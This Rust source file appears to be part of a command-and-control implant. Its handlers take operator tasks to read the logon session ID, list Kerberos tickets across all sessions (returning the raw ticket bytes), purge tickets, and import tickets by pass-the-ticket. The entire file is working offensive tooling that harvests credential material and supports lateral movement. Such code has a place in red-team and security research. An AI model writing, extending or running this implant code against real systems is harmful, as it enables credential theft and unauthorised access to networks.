//! Kerberos ticket management handlers.

use red_cell_common::demon::{DemonCommand, DemonKerberosCommand};
use tracing::{info, warn};

use super::{
    DispatchResult, Response, parse_bytes_le, parse_u32_le, write_bytes_le, write_u32_le,
    write_utf16le,
};

// ─── COMMAND_KERBEROS (2550) ────────────────────────────────────────────────

/// Route a `CommandKerberos` task to the appropriate sub-handler.
///
/// Incoming payload (LE): `[subcmd: u32][…sub-handler args…]`
pub(super) fn handle_kerberos(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandKerberos: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonKerberosCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandKerberos: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandKerberos dispatch");

    let rest = &payload[offset..];
    match subcmd {
        DemonKerberosCommand::Luid => handle_kerberos_luid(subcmd_raw),
        DemonKerberosCommand::Klist => handle_kerberos_klist(subcmd_raw, rest),
        DemonKerberosCommand::Purge => handle_kerberos_purge(subcmd_raw, rest),
        DemonKerberosCommand::Ptt => handle_kerberos_ptt(subcmd_raw, rest),
    }
}

/// `COMMAND_KERBEROS / Luid (0)` — get the current logon session LUID.
///
/// Incoming args: (none)
/// Outgoing payload (LE): `[subcmd: u32][success: u32][high: u32][low: u32]`
pub(super) fn handle_kerberos_luid(subcmd_raw: u32) -> DispatchResult {
    use crate::kerberos::native;

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    match native::get_luid() {
        Ok(luid) => {
            write_u32_le(&mut out, 1); // success = TRUE
            write_u32_le(&mut out, luid.high);
            write_u32_le(&mut out, luid.low);
        }
        Err(err) => {
            warn!(error_code = err, "Kerberos::Luid: failed to get LUID");
            write_u32_le(&mut out, 0); // success = FALSE
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandKerberos, out))
}

/// `COMMAND_KERBEROS / Klist (1)` — list Kerberos tickets.
///
/// Incoming args (LE): `[type: u32][luid: u32 (only if type == 1)]`
///   type 0 = /all (enumerate all sessions), type 1 = /luid (single session)
/// Outgoing payload (LE): `[subcmd: u32][success: u32][session_count: u32][…sessions…]`
pub(super) fn handle_kerberos_klist(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    use crate::kerberos::native;

    let mut offset = 0;
    let list_type = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Kerberos::Klist: failed to parse type: {e}");
            return DispatchResult::Ignore;
        }
    };

    let target_luid = if list_type == 1 {
        match parse_u32_le(rest, &mut offset) {
            Ok(v) => Some(v),
            Err(e) => {
                warn!("Kerberos::Klist: failed to parse target LUID: {e}");
                return DispatchResult::Ignore;
            }
        }
    } else {
        None
    };

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    match native::klist(target_luid) {
        Ok(sessions) => {
            write_u32_le(&mut out, 1); // success = TRUE
            #[allow(clippy::cast_possible_truncation)]
            write_u32_le(&mut out, sessions.len() as u32);

            for session in &sessions {
                write_utf16le(&mut out, &session.user_name);
                write_utf16le(&mut out, &session.domain);
                write_u32_le(&mut out, session.logon_id_low);
                write_u32_le(&mut out, session.logon_id_high);
                write_u32_le(&mut out, session.session);
                write_utf16le(&mut out, &session.user_sid);
                write_u32_le(&mut out, session.logon_time_low);
                write_u32_le(&mut out, session.logon_time_high);
                write_u32_le(&mut out, session.logon_type);
                write_utf16le(&mut out, &session.auth_package);
                write_utf16le(&mut out, &session.logon_server);
                write_utf16le(&mut out, &session.logon_server_dns_domain);
                write_utf16le(&mut out, &session.upn);

                #[allow(clippy::cast_possible_truncation)]
                write_u32_le(&mut out, session.tickets.len() as u32);

                for ticket in &session.tickets {
                    write_utf16le(&mut out, &ticket.client_name);
                    write_utf16le(&mut out, &ticket.client_realm);
                    write_utf16le(&mut out, &ticket.server_name);
                    write_utf16le(&mut out, &ticket.server_realm);
                    write_u32_le(&mut out, ticket.start_time_low);
                    write_u32_le(&mut out, ticket.start_time_high);
                    write_u32_le(&mut out, ticket.end_time_low);
                    write_u32_le(&mut out, ticket.end_time_high);
                    write_u32_le(&mut out, ticket.renew_time_low);
                    write_u32_le(&mut out, ticket.renew_time_high);
                    write_u32_le(&mut out, ticket.encryption_type);
                    write_u32_le(&mut out, ticket.ticket_flags);
                    write_bytes_le(&mut out, &ticket.ticket_data);
                }
            }
        }
        Err(err) => {
            warn!(error_code = err, "Kerberos::Klist: failed to list tickets");
            write_u32_le(&mut out, 0); // success = FALSE
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandKerberos, out))
}

/// `COMMAND_KERBEROS / Purge (2)` — purge Kerberos tickets for a LUID.
///
/// Incoming args (LE): `[luid: u32]`
/// Outgoing payload (LE): `[subcmd: u32][success: u32]`
pub(super) fn handle_kerberos_purge(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    use crate::kerberos::native;

    let mut offset = 0;
    let target_luid = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Kerberos::Purge: failed to parse LUID: {e}");
            return DispatchResult::Ignore;
        }
    };

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    match native::purge(target_luid) {
        Ok(()) => {
            write_u32_le(&mut out, 1); // success = TRUE
        }
        Err(err) => {
            warn!(error_code = err, "Kerberos::Purge: failed to purge tickets");
            write_u32_le(&mut out, 0); // success = FALSE
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandKerberos, out))
}

/// `COMMAND_KERBEROS / Ptt (3)` — pass-the-ticket (import a Kerberos ticket).
///
/// Incoming args (LE): `[ticket_len: u32][ticket: bytes][luid: u32]`
/// Outgoing payload (LE): `[subcmd: u32][success: u32]`
pub(super) fn handle_kerberos_ptt(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    use crate::kerberos::native;

    let mut offset = 0;
    let ticket = match parse_bytes_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Kerberos::Ptt: failed to parse ticket: {e}");
            return DispatchResult::Ignore;
        }
    };
    let target_luid = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Kerberos::Ptt: failed to parse LUID: {e}");
            return DispatchResult::Ignore;
        }
    };

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    match native::ptt(&ticket, target_luid) {
        Ok(()) => {
            write_u32_le(&mut out, 1); // success = TRUE
        }
        Err(err) => {
            warn!(error_code = err, "Kerberos::Ptt: failed to import ticket");
            write_u32_le(&mut out, 0); // success = FALSE
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandKerberos, out))
}
